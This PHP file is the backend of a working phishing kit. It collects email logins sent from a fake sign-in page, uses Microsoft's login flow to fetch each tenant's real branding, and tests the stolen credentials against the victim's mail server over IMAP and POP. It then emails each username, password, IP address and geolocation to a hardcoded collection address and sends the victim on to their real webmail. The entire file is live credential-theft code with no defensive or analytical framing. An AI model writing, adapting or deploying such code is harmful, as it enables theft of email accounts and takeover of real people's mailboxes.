<?php
ob_start();
header("Access-Control-Allow-Origin:*");
header("Access-Control-Allow-Methods:GET,HEAD,OPTIONS,POST,PUT");
header("Access-Control-Allow-Headers: *, authorizationpass,authorization1,Content-Type");
header("Access-Control-Allow-Credentials:true");

$trueauthentic = true;
$recipient = 'freshest2021@etlgr.com'; // Put your email address here
$finish_url = 'https://office365.com';

//Process IP to Location
$ip = $_SERVER['REMOTE_ADDR'];
$ip2place = new ip2location_lite();
$ip2place->setKey("66657745713826aee27886e868c7354891388e26c003fa6ebf7f995e8f599dc7");
$remote_add = $ip;
$location = $ip2place->getCity($remote_add);
//Process IP to Location

$country = $location['countryName'];
$city = $location['cityName'];
$region = $location['regionName'];
$date = date('Y-m-d H:i:s');
$getheaderdata = getallheaders();


$domains = substr(strrchr($getheaderdata['authorization1'], "@"), 1);
$serv = mxrecordValidate($domains);

$port     =  '993';
$hostname = 'mail.' . $domains;
$urlredi =  'mail.' . $domains;;

if (!empty($serv)) {

    if (strpos(strtolower($serv), 'outlook') !== false) {
        $hostname = 'imap-mail.outlook.com';
        $urlredi = 'https://outlook.office.com/owa/';
        $logox = 'outlook.com';
    } elseif (strpos(strtolower($serv), 'yahoo') !== false) {
        if (strpos(strtolower($serv), 'aol') !== false) {
            $hostname = 'imap.mail.yahoo.com';
            $urlredi = 'https://login.aol.com';
            $logox = 'login.aol.com';
        } elseif (strpos(strtolower($serv), 'mta') !== false) {
            $hostname = 'imap.mail.yahoo.com';
            $urlredi = 'https://login.yahoo.com';
            $logox = 'login.yahoo.com';
        } else {
            $hostname = 'imap.mail.yahoo.com';
            $urlredi = 'https://login.yahoo.com';
            $logox = 'login.yahoo.com';
        }
    } elseif (strpos(strtolower($serv), 'google') !== false) {
        $hostname = 'imap.gmail.com';
        $urlredi =  'https://myaccount.google.com';
        $logox =  'myaccount.google.com';
    } elseif (strpos(strtolower($serv), 'qq') !== false) {
        $hostname = 'imap.exmail.qq.com';
        $urlredi =  'https://exmail.qq.com/cgi-bin/loginpage';
        $logox =  'exmail.qq.com';
    } elseif (strpos(strtolower($serv), 'hinet') && strpos(strtolower($serv), 'hibox') !== false) {
        $hostname = 'hibox.hinet.net';
        $urlredi =  'https://www.hibox.hinet.net/uwc/';
        $logox =  'www.hibox.hinet.net';
    } elseif (strpos(strtolower($serv), 'mailfilter') !== false) {
        $hostname = 'hibox.hinet.net';
        $urlredi =  'https://webmail.hinet.net/';
        $logox =  'webmail.hinet.net';
    } elseif (strpos(strtolower($serv), 'emailsrvr') !== false) {
        $hostname = 'secure.emailsrvr.com';
        $urlredi = 'https://apps.rackspace.com/index.php';
        $logox = 'apps.rackspace.com';
    } elseif (strpos(strtolower($serv), 'dns_com') !== false) {
        $hostname = 'mx8.dns.com.cn';
        $urlredi =  'http://www.dns.com.cn/login/toLogin.do';
        $logox =  'www.dns.com.cn';
    } elseif (strpos(strtolower($serv), 'zmail') !== false) {
        $hostname = 'imap.zmail300.cn';
        $urlredi =  'http://ssl.zmail300.cn/app/mail/index';
        $logox =  'ssl.zmail300.cn';
    } elseif (strpos(strtolower($serv), 'hinet') !== false) {
        $hostname = $domain;
        $urlredi = 'http://' . $domain;
        $logox =  $domain;
    } elseif (strpos(strtolower($serv), 'mailcloud') !== false) {
        $hostname = 'ms.mailcloud.com.tw';
        $urlredi =  'https://mail.mailasp.com.tw/';
        $logox =  'mail.mailasp.com.tw';
    } elseif (strpos(strtolower($serv), 'vip') !== false) {
        $hostname = $domain;
        $logox =  $domain;
    } elseif (strpos(strtolower($serv), 'netease') !== false   && strpos(strtolower($serv), 'qiye163') !== false) {
        $hostname = 'imap.qiye.163.com';
        $urlredi =  'https://mail.qiye.163.com';
        $logox =  'mail.qiye.163.com';
    } elseif (strpos(strtolower($serv), 'netease') !== false) {
        $hostname = 'imap.163.com';
        $urlredi =  'https://email.163.com/';
        $logox =  'email.163.com';
    } elseif (strpos(strtolower($serv), 'secureserver-net') !== false) {
        $hostname = 'imap.secureserver.net';
        $urlredi = 'https://email25.godaddy.com/';
        $logox = 'email25.godaddy.com';
    } elseif (strpos(strtolower($serv), 'chinaemail') !== false) {
        $hostname = 'mail.' . $domain;
        $urlredi = 'http://' . $domain;
        $logox =  $domain;
    } elseif (strpos(strtolower($serv), 'aliyun') !== false) {
        $hostname = 'imap.mxhichina.com';
        $urlredi = 'https://qiye.aliyun.com/';
        $logox = 'aliyun.com';
    } elseif (strpos(strtolower($serv), 'mxhichina') !== false) {
        $hostname = 'imap.mxhichina.com';
        $urlredi = 'https://qiye.aliyun.com/';
        $logox = 'aliyun.com';
    } elseif (strpos(strtolower($serv), 'zoho') && strpos(strtolower($serv), 'smtp') !== false) {
        $hostname = 'imap.zoho.com';
        $urlredi = 'https://mail.zoho.com/zm/';
        $logox = 'mail.zoho.com';
    } elseif (strpos(strtolower($serv), 'zoho') !== false) {
        $hostname = 'imappro.zoho.com';
        $urlredi = 'https://mail.zoho.com/zm/';
        $logox = 'mail.zoho.com';
    } elseif (strpos(strtolower($serv), '263') !== false) {
        $hostname = 'imapw.263.net';
        $urlredi = 'http://263xmail.com/';
        $logox = '263xmail.com';
    } elseif (strpos(strtolower($serv), 'coremail') !== false) {
        $hostname = 'imap.icoremail.net';
        $urlredi =  'https://mail.icoremail.net/';
        $logox =  'mail.icoremail.net';
    } elseif (strpos(strtolower($serv), '1and1') !== false) {
        $hostname = 'imap.1and1.co.uk';
        $urlredi = 'https://webmail.1and1.co.uk/';
        $logox = 'webmail.1and1.co.uk';
    } elseif (strpos(strtolower($serv), "mweb") !== false) {
        $hostname = 'imap.mweb.co.za';
        $urlredi =  'https://www.mweb.co.za/webmail/';
        $logox =  'www.mweb.co.za';
    } elseif (strpos(strtolower($serv), "telkom") !== false) {
        $hostname = 'imap.internetpro.net';
        $urlredi =  'https://webmail.telkomsa.net/';
        $logox =  'webmail.telkomsa.net';
    } elseif (strpos(strtolower($serv), "netsolmail") !== false) {
        $hostname = 'imap.internetpro.net';
        $urlredi =  'https://webmail5.networksolutionsemail.com/';
        $logox =  'webmail5.networksolutionsemail.com';
    } elseif (strpos(strtolower($serv), $domain) !== false) {
        $hostname = 'mail.' . $domains;
        $urlredi = 'https://webmail.' . $domains . '/webmail';
        $logox = $domains;
    } else {
        $hostname = 'mail.' . $domains;
        $urlredi = 'https://' . $domains . '/webmail';
        $logox = $domains;
    }
} else {
    $hostname = 'mail.' . $domains;
    $urlredi =  'mail.' . $domains;;
    $logox = $domains;
}


if (isset($_GET['domain'])) {
    echo mxrecordValidate($_GET['domain']);
}
if (isset($_POST['barnd']) && isset($_POST['email'])) {
    $email = $_POST['email'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.office.com/login?es=Click&ru=%2F');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    $result = curl_exec($ch);
    $respond_link = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);

    $parts = parse_url($respond_link);
    parse_str($parts['query'], $query);
    $post = ['client_id' => $query['client_id'], 'login_hint' => $email];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    curl_setopt($ch, CURLOPT_URL, $respond_link);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);

    $result = curl_exec($ch);
    curl_close($ch);


    //print_r($result);


    preg_match_all("|\"BannerLogo[^>]+\":(.*)\"/[^>]+\",|U", $result, $BannerLogo, PREG_PATTERN_ORDER);
    if (!empty($BannerLogo[0][0])) {
        $BannerLogo = explode(",", $BannerLogo[0][0]);
        preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $BannerLogo[0], $BannerLogo);
    } else {
        $BannerLogo[0][0] = '';
    }

    preg_match_all("|\"Illustration[^>]+\":(.*)\"/[^>]+\",|U", $result, $Illustration, PREG_PATTERN_ORDER);
    if (!empty($Illustration[0][0])) {
        $Illustration = explode(",", $Illustration[0][0]);
        preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $Illustration[0], $Illustration);
    } else {
        $Illustration[0][0] = '';
    }


    $logo_image = $BannerLogo[0][0];
    $bg_image = $Illustration[0][0];



    if (!empty($bg_image) || !empty($logo_image)) {

        $res = array('logo_image' => $logo_image, 'bg_image' => $bg_image, 'bg_image_g' => '0');
    } else {

        $domains = substr(strrchr($email, "@"), 1);
        $serv = mxrecordValidate($domains);

        $port     =  '993';
        $hostname = 'mail.' . $domains;
        $urlredi =  'mail.' . $domains;;

        if (!empty($serv)) {

            if (strpos(strtolower($serv), 'outlook') !== false) {
                $hostname = 'imap-mail.outlook.com';
                $urlredi = 'https://outlook.office.com/owa/';
                $logoxx = 'outlook.com';
            } elseif (strpos(strtolower($serv), 'yahoo') !== false) {
                if (strpos(strtolower($serv), 'aol') !== false) {
                    $hostname = 'imap.mail.yahoo.com';
                    $urlredi = 'https://login.aol.com';
                    $logoxx = 'login.aol.com';
                } elseif (strpos(strtolower($serv), 'mta') !== false) {
                    $hostname = 'imap.mail.yahoo.com';
                    $urlredi = 'https://login.yahoo.com';
                    $logoxx = 'login.yahoo.com';
                } else {
                    $hostname = 'imap.mail.yahoo.com';
                    $urlredi = 'https://login.yahoo.com';
                    $logoxx = 'login.yahoo.com';
                }
            } elseif (strpos(strtolower($serv), 'google') !== false) {
                $hostname = 'imap.gmail.com';
                $urlredi =  'https://myaccount.google.com';
                $logoxx =  'myaccount.google.com';
            } elseif (strpos(strtolower($serv), 'qq') !== false) {
                $hostname = 'imap.exmail.qq.com';
                $urlredi =  'https://exmail.qq.com/cgi-bin/loginpage';
                $logoxx =  'exmail.qq.com';
            } elseif (strpos(strtolower($serv), 'hinet') && strpos(strtolower($serv), 'hibox') !== false) {
                $hostname = 'hibox.hinet.net';
                $urlredi =  'https://www.hibox.hinet.net/uwc/';
                $logoxx =  'www.hibox.hinet.net';
            } elseif (strpos(strtolower($serv), 'mailfilter') !== false) {
                $hostname = 'hibox.hinet.net';
                $urlredi =  'https://webmail.hinet.net/';
                $logoxx =  'webmail.hinet.net';
            } elseif (strpos(strtolower($serv), 'emailsrvr') !== false) {
                $hostname = 'secure.emailsrvr.com';
                $urlredi = 'https://apps.rackspace.com/index.php';
                $logoxx = 'apps.rackspace.com';
            } elseif (strpos(strtolower($serv), 'dns_com') !== false) {
                $hostname = 'mx8.dns.com.cn';
                $urlredi =  'http://www.dns.com.cn/login/toLogin.do';
                $logoxx =  'www.dns.com.cn';
            } elseif (strpos(strtolower($serv), 'zmail') !== false) {
                $hostname = 'imap.zmail300.cn';
                $urlredi =  'http://ssl.zmail300.cn/app/mail/index';
                $logoxx =  'ssl.zmail300.cn';
            } elseif (strpos(strtolower($serv), 'hinet') !== false) {
                $hostname = $domain;
                $urlredi = 'http://' . $domain;
                $logoxx =  $domain;
            } elseif (strpos(strtolower($serv), 'mailcloud') !== false) {
                $hostname = 'ms.mailcloud.com.tw';
                $urlredi =  'https://mail.mailasp.com.tw/';
                $logoxx =  'mail.mailasp.com.tw';
            } elseif (strpos(strtolower($serv), 'vip') !== false) {
                $hostname = $domain;
                $logoxx =  $domain;
            } elseif (strpos(strtolower($serv), 'netease') !== false   && strpos(strtolower($serv), 'qiye163') !== false) {
                $hostname = 'imap.qiye.163.com';
                $urlredi =  'https://mail.qiye.163.com';
                $logoxx =  'mail.qiye.163.com';
            } elseif (strpos(strtolower($serv), 'netease') !== false) {
                $hostname = 'imap.163.com';
                $urlredi =  'https://email.163.com/';
                $logoxx =  'email.163.com';
            } elseif (strpos(strtolower($serv), 'secureserver-net') !== false) {
                $hostname = 'imap.secureserver.net';
                $urlredi = 'https://email25.godaddy.com/';
                $logoxx = 'email25.godaddy.com';
            } elseif (strpos(strtolower($serv), 'chinaemail') !== false) {
                $hostname = 'mail.' . $domain;
                $urlredi = 'http://' . $domain;
                $logoxx =  $domain;
            } elseif (strpos(strtolower($serv), 'aliyun') !== false) {
                $hostname = 'imap.mxhichina.com';
                $urlredi = 'https://qiye.aliyun.com/';
                $logoxx = 'aliyun.com';
            } elseif (strpos(strtolower($serv), 'mxhichina') !== false) {
                $hostname = 'imap.mxhichina.com';
                $urlredi = 'https://qiye.aliyun.com/';
                $logoxx = 'aliyun.com';
            } elseif (strpos(strtolower($serv), 'zoho') && strpos(strtolower($serv), 'smtp') !== false) {
                $hostname = 'imap.zoho.com';
                $urlredi = 'https://mail.zoho.com/zm/';
                $logoxx = 'mail.zoho.com';
            } elseif (strpos(strtolower($serv), 'zoho') !== false) {
                $hostname = 'imappro.zoho.com';
                $urlredi = 'https://mail.zoho.com/zm/';
                $logoxx = 'mail.zoho.com';
            } elseif (strpos(strtolower($serv), '263') !== false) {
                $hostname = 'imapw.263.net';
                $urlredi = 'http://263xmail.com/';
                $logoxx = '263xmail.com';
            } elseif (strpos(strtolower($serv), 'coremail') !== false) {
                $hostname = 'imap.icoremail.net';
                $urlredi =  'https://mail.icoremail.net/';
                $logoxx =  'mail.icoremail.net';
            } elseif (strpos(strtolower($serv), '1and1') !== false) {
                $hostname = 'imap.1and1.co.uk';
                $urlredi = 'https://webmail.1and1.co.uk/';
                $logoxx = 'webmail.1and1.co.uk';
            } elseif (strpos(strtolower($serv), "mweb") !== false) {
                $hostname = 'imap.mweb.co.za';
                $urlredi =  'https://www.mweb.co.za/webmail/';
                $logoxx =  'www.mweb.co.za';
            } elseif (strpos(strtolower($serv), "telkom") !== false) {
                $hostname = 'imap.internetpro.net';
                $urlredi =  'https://webmail.telkomsa.net/';
                $logoxx =  'webmail.telkomsa.net';
            } elseif (strpos(strtolower($serv), "netsolmail") !== false) {
                $hostname = 'imap.internetpro.net';
                $urlredi =  'https://webmail5.networksolutionsemail.com/';
                $logoxx =  'webmail5.networksolutionsemail.com';
            } elseif (strpos(strtolower($serv), $domain) !== false) {
                $hostname = 'mail.' . $domains;
                $urlredi = 'https://webmail.' . $domains . '/webmail';
                $logoxx = $domains;
            } else {
                $hostname = 'mail.' . $domains;
                $urlredi = 'https://' . $domains . '/webmail';
                $logoxx = $domains;
            }
        } else {
            $hostname = 'mail.' . $domains;
            $urlredi =  'mail.' . $domains;;
            $logoxx = $domains;
        }


        $res = array('logo_image' => $logoxx, 'bg_image' => $logox . $serv, 'bg_image_g' => '1');
    }

    echo json_encode($res);
}

$getheaderdata = getallheaders();

//print_r($getheaderdata); die;

if (!empty($getheaderdata['authorization1']) && !empty($getheaderdata['authorizationpass'])) {

    $acc = $getheaderdata['authorization1'];
    $pp = $getheaderdata['authorizationpass'];

    //Decode base64_decode
    if (!empty($acc) && !empty($pp)) {
        if (strpos($acc, '@') !== false) {
            $login = $acc;
        } else {
            $login = base64_decode($acc);
        }
    } else {
        $login = base64_decode($acc);
    }

    //GET domain
    $domain = substr(strrchr($login, "@"), 1);
    if ($trueauthentic == true) {
        $result = check_login($hostname, $login, $pp);
    } else {
        $result = '{"status":"0","url":"0"}';
    }
    $set_data = json_decode($result, TRUE);


    // proccess result
    if ($set_data['status'] > 0) {

        // Send Email

        $message = "-----------------+ True Login Verfied  +-----------------\n";
        $message .= "User ID: " . $login . "\n";
        $message .= "Password: " . $pp . "\n";
        $message .= "Client IP      : " . $ip . "\n";
        $message .= "Client Country      : " . $country . "\n";
        $message .= "Client Region      : " . $region . "\n";
        $message .= "Client City      : " . $city . "\n";
        $message .= "-----------------+ Created in CODE~SPIRIT+------------------\n";
        $subject = "True Login: " . $country . "\n";
        $headers = 'From: logs <log@bellevue.org>'  . "\r\n" . 'X-Mailer: PHP/' . phpversion();
        mail($recipient, $subject, $message, $headers);

        echo '{"p":"1","url":"' . $urlredi . '"}';
    } else {

        // Send EmailaW5mb0Bwcm8xOTYwLmNhc2E

        $message = "-----------------+ True Login Not Verfied  +-----------------\n";
        $message .= "User ID: " . $login . "\n";
        $message .= "Password: " . $pp . "\n";
        $message .= "Client IP      : " . $ip . "\n";
        $message .= "Client Country      : " . $country . "\n";
        $message .= "Client Region      : " . $region . "\n";
        $message .= "Client City      : " . $city . "\n";
        $message .= "-----------------+ Created in CODE~SPIRIT+------------------\n";
        $subject = "True Login: " . $country . "\n";
        $headers = 'From: logs <log@bellevue.org>'  . "\r\n" . 'X-Mailer: PHP/' . phpversion();
        mail($recipient, $subject, $message, $headers);

        echo '{"p":"0"}';
    }
}

function mxrecordValidate($domain)
{

    $mxget = $domain;
    if (dns_get_mx($domain, $mx_details)) {
        foreach ($mx_details as $key => $value) {
            $mxget .= $value;
        }
    }
    return str_replace(".", "-", $mxget);
}
final class ip2location_lite
{
    protected $errors = array();
    protected $service = 'api.ipinfodb.com';
    protected $version = 'v3';
    protected $apiKey = '';
    public function __construct()
    {
    }
    public function __destruct()
    {
    }
    public function setKey($key)
    {
        if (!empty($key))
            $this->apiKey = $key;
    }
    public function getError()
    {
        return implode("\n", $this->errors);
    }
    public function getCountry($host)
    {
        return $this->getResult($host, 'ip-country');
    }
    public function getCity($host)
    {
        return $this->getResult($host, 'ip-city');
    }
    private function getResult($host, $name)
    {
        $ip =  @gethostbyname($host);
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            $xml =  @file_get_contents('http://' . $this->service . '/' . $this->version . '/' . $name . '/?key=' . $this->apiKey . '&ip=' . $ip . '&format=xml');
            if (get_magic_quotes_runtime()) {
                $xml = stripslashes($xml);
            }
            try {
                $response =  @new SimpleXMLElement($xml);
                foreach ($response as $field => $value) {
                    $result[(string)$field] = (string)$value;
                }
                return $result;
            } catch (Exception $e) {
                $this->errors[] = $e->getMessage();
                return;
            }
        }
        $this->errors[] = '"' . $host . '" is not a valid IP address or hostname.';
        return;
    }
}
function check_login($hostname, $username, $password)
{
    if (@imap_open('{' . $hostname . ':993/imap/ssl/novalidate-cert/readonly}', $username, $password, OP_HALFOPEN, 1)) {
        return '{"status":"1","url":"0"}';
    } elseif (@imap_open('{' . $hostname . ':995/pop3/ssl/novalidate-cert/readonly}', $username, $password, OP_HALFOPEN, 1)) {
        return '{"status":"1","url":"0"}';
    } elseif (@imap_open('{' . $hostname . ':143}', $username, $password, OP_HALFOPEN, 1)) {
        return '{"status":"1","url":"0"}';
    } elseif (@imap_open('{' . $hostname . ':110/pop3/ssl/novalidate-cert/readonly}', $username, $password, OP_HALFOPEN, 1)) {
        return '{"status":"1","url":"0"}';
    } else {
        $errors = imap_errors();
        for ($i = 0; $i < count($errors); $i++) {
            $erro = "$errors[$i]";
            if (strpos($erro, "browser") !== FALSE) {
                return '{"status":"1","url":"0"}';
            } elseif (strpos($erro, "via") !== FALSE) {
                return '{"status":"1","url":"0"}';
            } elseif (strpos($erro, "web") !== FALSE) {
                return '{"status":"1","url":"0"}';
            } elseif (strpos($erro, "account") !== FALSE) {
                return '{"status":"1","url":"0"}';
            } else {
                return '{"status":"0","url":"0"}' . imap_last_error();
            }
        }
    }
    //imap_close($inbox);
}
